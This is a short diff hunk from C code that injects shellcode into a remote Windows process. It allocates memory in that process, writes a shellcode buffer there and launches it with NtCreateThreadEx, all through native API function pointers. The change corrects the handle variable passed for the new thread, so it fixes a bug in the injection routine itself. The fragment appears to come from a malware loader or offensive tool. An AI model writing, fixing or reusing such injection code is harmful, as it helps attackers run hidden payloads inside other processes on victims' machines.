@@ -152,7 +152,7 @@ STATUS = pAllocate(hProcess, &rBuffer, NULL, &szShellcode, (MEM_COMMIT | MEM_RES
 // NtWriteVirtualMemory
 STATUS = pWrite(hProcess, rBuffer, bin, sizeof(bin), &bytesWritten);
 // NtCreateThreadEx
-STATUS = pCreateThreadEx(&hProcess, THREAD_ALL_ACCESS, &oAttrib, hProcess, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, 0);
+STATUS = pCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oAttrib, hProcess, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, 0);
 WaitForSingleObject(hProcess, INFINITE);
 // NtClose
 STATUS = pClose(hThread);
